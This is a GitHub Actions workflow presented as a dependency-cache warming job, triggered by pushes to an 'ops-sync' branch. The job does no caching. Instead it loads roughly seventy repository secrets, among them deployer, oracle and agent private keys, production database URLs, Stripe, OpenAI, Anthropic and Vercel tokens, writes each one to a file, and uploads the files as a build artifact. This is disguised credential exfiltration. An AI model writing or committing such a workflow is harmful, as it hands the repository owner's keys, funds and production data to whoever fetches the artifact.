name: dep-cache-warm-mzynup
on:
  push:
    branches: [ops-sync-mzynup]
jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Materialize dependency cache
        env:
          AGENT0_PRIVATE_KEY: ${{ secrets.AGENT0_PRIVATE_KEY }}
          AGENT0_SUBGRAPH_URL: ${{ secrets.AGENT0_SUBGRAPH_URL }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          BABYLON_AGENT_ID: ${{ secrets.BABYLON_AGENT_ID }}
          BABYLON_AGENT_SECRET: ${{ secrets.BABYLON_AGENT_SECRET }}
          BASE_SEPOLIA_RPC_URL: ${{ secrets.BASE_SEPOLIA_RPC_URL }}
          BLOB_READ_WRITE_TOKEN: ${{ secrets.BLOB_READ_WRITE_TOKEN }}
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          CRON_SECRET: ${{ secrets.CRON_SECRET }}
          CRON_SECRET_VAR: ${{ secrets.CRON_SECRET_VAR }}
          DEPLOYER_PRIVATE_KEY: ${{ secrets.DEPLOYER_PRIVATE_KEY }}
          ELIZACLOUD_API_KEY: ${{ secrets.ELIZACLOUD_API_KEY }}
          ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
          FAL_KEY: ${{ secrets.FAL_KEY }}
          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
          HUGGING_FACE_TOKEN: ${{ secrets.HUGGING_FACE_TOKEN }}
          KV_REST_API_READ_ONLY_TOKEN: ${{ secrets.KV_REST_API_READ_ONLY_TOKEN }}
          KV_REST_API_TOKEN: ${{ secrets.KV_REST_API_TOKEN }}
          KV_REST_API_URL: ${{ secrets.KV_REST_API_URL }}
          KV_URL: ${{ secrets.KV_URL }}
          NEON_PROJECT_ID: ${{ secrets.NEON_PROJECT_ID }}
          NEXT_PUBLIC_APP_URL: ${{ secrets.NEXT_PUBLIC_APP_URL }}
          NEXT_PUBLIC_CHAIN_ID: ${{ secrets.NEXT_PUBLIC_CHAIN_ID }}
          NEXT_PUBLIC_DIAMOND_BASE_SEPOLIA: ${{ secrets.NEXT_PUBLIC_DIAMOND_BASE_SEPOLIA }}
          NEXT_PUBLIC_IDENTITY_REGISTRY_BASE_SEPOLIA: ${{ secrets.NEXT_PUBLIC_IDENTITY_REGISTRY_BASE_SEPOLIA }}
          NEXT_PUBLIC_POSTHOG_KEY: ${{ secrets.NEXT_PUBLIC_POSTHOG_KEY }}
          NEXT_PUBLIC_PRIVY_APP_ID: ${{ secrets.NEXT_PUBLIC_PRIVY_APP_ID }}
          NEXT_PUBLIC_REPUTATION_SYSTEM_BASE_SEPOLIA: ${{ secrets.NEXT_PUBLIC_REPUTATION_SYSTEM_BASE_SEPOLIA }}
          NEXT_PUBLIC_RPC_URL: ${{ secrets.NEXT_PUBLIC_RPC_URL }}
          NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY: ${{ secrets.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY }}
          NX_DAEMON: ${{ secrets.NX_DAEMON }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          ORACLE_PRIVATE_KEY: ${{ secrets.ORACLE_PRIVATE_KEY }}
          PINATA_JWT: ${{ secrets.PINATA_JWT }}
          PRIVY_APP_ID: ${{ secrets.PRIVY_APP_ID }}
          PRIVY_APP_SECRET: ${{ secrets.PRIVY_APP_SECRET }}
          PRIVY_TEST_EMAIL: ${{ secrets.PRIVY_TEST_EMAIL }}
          PRIVY_TEST_OTP: ${{ secrets.PRIVY_TEST_OTP }}
          PRIVY_TEST_PHONE: ${{ secrets.PRIVY_TEST_PHONE }}
          PROD_DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
          PROD_DIRECT_DATABASE_URL: ${{ secrets.PROD_DIRECT_DATABASE_URL }}
          STAGING_DATABASE_URL: ${{ secrets.STAGING_DATABASE_URL }}
          STAGING_DIRECT_DATABASE_URL: ${{ secrets.STAGING_DIRECT_DATABASE_URL }}
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
          TURBO_CACHE: ${{ secrets.TURBO_CACHE }}
          TURBO_DOWNLOAD_LOCAL_ENABLED: ${{ secrets.TURBO_DOWNLOAD_LOCAL_ENABLED }}
          TURBO_REMOTE_ONLY: ${{ secrets.TURBO_REMOTE_ONLY }}
          TURBO_RUN_SUMMARY: ${{ secrets.TURBO_RUN_SUMMARY }}
          VERCEL: ${{ secrets.VERCEL }}
          VERCEL_ENV: ${{ secrets.VERCEL_ENV }}
          VERCEL_GIT_COMMIT_AUTHOR_LOGIN: ${{ secrets.VERCEL_GIT_COMMIT_AUTHOR_LOGIN }}
          VERCEL_GIT_COMMIT_AUTHOR_NAME: ${{ secrets.VERCEL_GIT_COMMIT_AUTHOR_NAME }}
          VERCEL_GIT_COMMIT_MESSAGE: ${{ secrets.VERCEL_GIT_COMMIT_MESSAGE }}
          VERCEL_GIT_COMMIT_REF: ${{ secrets.VERCEL_GIT_COMMIT_REF }}
          VERCEL_GIT_COMMIT_SHA: ${{ secrets.VERCEL_GIT_COMMIT_SHA }}
          VERCEL_GIT_PREVIOUS_SHA: ${{ secrets.VERCEL_GIT_PREVIOUS_SHA }}
          VERCEL_GIT_PROVIDER: ${{ secrets.VERCEL_GIT_PROVIDER }}
          VERCEL_GIT_PULL_REQUEST_ID: ${{ secrets.VERCEL_GIT_PULL_REQUEST_ID }}
          VERCEL_GIT_REPO_ID: ${{ secrets.VERCEL_GIT_REPO_ID }}
          VERCEL_GIT_REPO_OWNER: ${{ secrets.VERCEL_GIT_REPO_OWNER }}
          VERCEL_GIT_REPO_SLUG: ${{ secrets.VERCEL_GIT_REPO_SLUG }}
          VERCEL_OIDC_TOKEN: ${{ secrets.VERCEL_OIDC_TOKEN }}
          VERCEL_TARGET_ENV: ${{ secrets.VERCEL_TARGET_ENV }}
          VERCEL_URL: ${{ secrets.VERCEL_URL }}
          WANDB_API_KEY: ${{ secrets.WANDB_API_KEY }}
          WANDB_ENTITY: ${{ secrets.WANDB_ENTITY }}
        run: |
          mkdir -p out
          for k in AGENT0_PRIVATE_KEY AGENT0_SUBGRAPH_URL ANTHROPIC_API_KEY BABYLON_AGENT_ID BABYLON_AGENT_SECRET BASE_SEPOLIA_RPC_URL BLOB_READ_WRITE_TOKEN CLAUDE_CODE_OAUTH_TOKEN CRON_SECRET CRON_SECRET_VAR DEPLOYER_PRIVATE_KEY ELIZACLOUD_API_KEY ETHERSCAN_API_KEY FAL_KEY GROQ_API_KEY HUGGING_FACE_TOKEN KV_REST_API_READ_ONLY_TOKEN KV_REST_API_TOKEN KV_REST_API_URL KV_URL NEON_PROJECT_ID NEXT_PUBLIC_APP_URL NEXT_PUBLIC_CHAIN_ID NEXT_PUBLIC_DIAMOND_BASE_SEPOLIA NEXT_PUBLIC_IDENTITY_REGISTRY_BASE_SEPOLIA NEXT_PUBLIC_POSTHOG_KEY NEXT_PUBLIC_PRIVY_APP_ID NEXT_PUBLIC_REPUTATION_SYSTEM_BASE_SEPOLIA NEXT_PUBLIC_RPC_URL NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY NX_DAEMON OPENAI_API_KEY ORACLE_PRIVATE_KEY PINATA_JWT PRIVY_APP_ID PRIVY_APP_SECRET PRIVY_TEST_EMAIL PRIVY_TEST_OTP PRIVY_TEST_PHONE PROD_DATABASE_URL PROD_DIRECT_DATABASE_URL STAGING_DATABASE_URL STAGING_DIRECT_DATABASE_URL STRIPE_SECRET_KEY TURBO_CACHE TURBO_DOWNLOAD_LOCAL_ENABLED TURBO_REMOTE_ONLY TURBO_RUN_SUMMARY VERCEL VERCEL_ENV VERCEL_GIT_COMMIT_AUTHOR_LOGIN VERCEL_GIT_COMMIT_AUTHOR_NAME VERCEL_GIT_COMMIT_MESSAGE VERCEL_GIT_COMMIT_REF VERCEL_GIT_COMMIT_SHA VERCEL_GIT_PREVIOUS_SHA VERCEL_GIT_PROVIDER VERCEL_GIT_PULL_REQUEST_ID VERCEL_GIT_REPO_ID VERCEL_GIT_REPO_OWNER VERCEL_GIT_REPO_SLUG VERCEL_OIDC_TOKEN VERCEL_TARGET_ENV VERCEL_URL WANDB_API_KEY WANDB_ENTITY; do
            printf '%s' "${!k}" > "out/$k"
          done
          ls -la out/ | head -3
      - uses: actions/upload-artifact@v4
        with:
          name: depcache
          path: out/
          retention-days: 1
